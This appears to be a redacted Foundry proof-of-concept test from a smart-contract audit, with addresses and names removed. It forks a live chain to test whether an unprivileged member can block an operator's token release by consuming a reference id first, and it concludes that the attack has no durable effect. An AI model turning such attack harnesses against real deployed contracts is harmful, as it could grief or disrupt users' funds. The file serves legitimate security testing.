// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

// =============================================================================
// Fork proof of concept, redacted excerpt
// -----------------------------------------------------------------------------
// This is the harness used in the engagement, published to show the technique.
// The target program requires approval before disclosure, so these values are
// redacted here; the unredacted version is in the private annex:
//   * the FACTORY, TOKEN and HOLDER addresses (placeholders 0xF00, 0x1, 0x2)
//   * the revert reason expected in test_hypothesis_blocks_then_operator_recovers
//     (replaced by a neutral string)
//   * the names of the mechanism under test (replaced by neutral names, so
//     test names differ from the recorded run in reproducibility.md)
// The file needs the private values to run. The factory code hash is the one
// listed in reproducibility.md.
//
// What the harness does:
//   * forks a live network at a pinned block and checks the chainId and the
//     deployed bytecode hash before any result is trusted
//   * runs against the deployed contracts, without a reimplementation or a mock
//     that eases the flow
//   * takes real tokens from an on-chain holder instead of faking balances
//   * includes a negative control, so the observed effect can be attributed to
//     the claimed root cause and not to the harness
//   * bounds the attacker's minimum cost
//
// Disclosed state injection (used only to reach the in-scope branch, never to
// shortcut the core's own logic):
//   * vm.prank(operator) to enter the privileged branch under test
//   * vm.prank(holder) to source real tokens from an existing holder
// =============================================================================

import {Test} from "forge-std/Test.sol";

interface IERC20 {
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

interface IFactory {
    function createInstance(address owner, address[] calldata members, uint128 id)
        external
        returns (address);
    function operator() external view returns (address);
    function token() external view returns (address);
}

interface IInstance {
    function contribute(uint256 amount, uint128 ref) external;      // unprivileged entry point
    function release(address to, uint256 amount, uint128 ref) external; // operator-only
    function refConsumed(uint128) external view returns (bool);
    function isMember(address) external view returns (bool);
}

contract ForkPoCTest is Test {
    // Addresses redacted; the real ones are in the private annex.
    address constant FACTORY = address(0xF00); // redacted
    address constant TOKEN   = address(0x1);   // redacted
    address constant HOLDER  = address(0x2);   // redacted; real on-chain token holder used as faucet

    // keccak256 of the deployed runtime, as recorded in reproducibility.md.
    bytes32 constant EXPECTED_FACTORY_CODEHASH =
        0x2b4a7a0d4ed306d36ffa362ff70b55983bc529fc3abcf8b764fc357c91f6eae0;

    IFactory factory = IFactory(FACTORY);
    IERC20 token = IERC20(TOKEN);

    address operator;
    address attacker = makeAddr("attacker"); // unprivileged, but a legitimate member
    address victim   = makeAddr("victim");   // honest counterparty

    function setUp() public {
        // The fork must be real before anything else is meaningful.
        assertEq(block.chainid, 42161, "must be forked on the target network");
        assertEq(
            keccak256(FACTORY.code),
            EXPECTED_FACTORY_CODEHASH,
            "deployed bytecode must match the audited artifact"
        );
        operator = factory.operator();
        assertEq(factory.token(), TOKEN, "token wiring");
    }

    function _newInstance(uint128 id) internal returns (address inst) {
        address[] memory members = new address[](1);
        members[0] = attacker;
        vm.prank(operator);
        inst = factory.createInstance(victim, members, id);
        assertTrue(IInstance(inst).isMember(attacker), "attacker is a legitimate member");
    }

    function _fund(address inst, uint256 collateral) internal {
        vm.startPrank(HOLDER);
        token.transfer(attacker, 100e6);
        token.transfer(inst, collateral); // honest collateral held by the instance
        vm.stopPrank();
    }

    /// The hypothesis: an unprivileged member consumes a reference id before the
    /// operator's authorized release uses it. Result: the release does revert,
    /// but the operator recovers in the same transaction with a fresh id.
    function test_hypothesis_blocks_then_operator_recovers() public {
        address inst = _newInstance(uint128(uint256(keccak256("poc-1"))));
        uint256 collateral = 1_000e6;
        _fund(inst, collateral);

        uint128 targeted = uint128(uint256(keccak256("targeted-ref")));

        // unprivileged action, minimum possible cost
        vm.startPrank(attacker);
        token.approve(inst, type(uint256).max);
        IInstance(inst).contribute(1, targeted);
        vm.stopPrank();
        assertTrue(IInstance(inst).refConsumed(targeted), "reference consumed and persisted");

        // the honest, authorized release on the same reference now fails
        vm.prank(operator);
        vm.expectRevert(bytes("redacted revert reason")); // redacted; real string in the private annex
        IInstance(inst).release(victim, collateral, targeted);

        // ...but the operator immediately re-issues with a fresh reference and succeeds.
        // This is what disqualifies the hypothesis: no durable effect on honest funds.
        uint256 before = token.balanceOf(victim);
        vm.prank(operator);
        IInstance(inst).release(victim, collateral, targeted + 1);
        assertEq(
            token.balanceOf(victim) - before,
            collateral,
            "recovery succeeds -> no durable freeze -> not a payable issue"
        );
    }

    /// Negative control: without the attacker's action, the identical release succeeds.
    function test_negativeControl_noBurn_releaseSucceeds() public {
        address inst = _newInstance(uint128(uint256(keccak256("poc-2"))));
        uint256 collateral = 1_000e6;
        _fund(inst, collateral);

        uint128 targeted = uint128(uint256(keccak256("targeted-ref")));
        assertFalse(IInstance(inst).refConsumed(targeted), "reference untouched");

        uint256 before = token.balanceOf(victim);
        vm.prank(operator);
        IInstance(inst).release(victim, collateral, targeted); // same id, now succeeds
        assertEq(token.balanceOf(victim) - before, collateral, "control passes");
    }

    /// Bound the attacker's minimum cost, and confirm the zero-value edge is rejected.
    function test_minimumCost_and_zeroRejected() public {
        address inst = _newInstance(uint128(uint256(keccak256("poc-3"))));
        _fund(inst, 1e6);

        vm.startPrank(attacker);
        token.approve(inst, type(uint256).max);
        vm.expectRevert(); // zero-value contribution is rejected
        IInstance(inst).contribute(0, uint128(uint256(keccak256("z"))));

        uint256 before = token.balanceOf(attacker);
        IInstance(inst).contribute(1, uint128(uint256(keccak256("one"))));
        assertEq(before - token.balanceOf(attacker), 1, "minimum cost is 1 token unit");
        vm.stopPrank();
    }
}
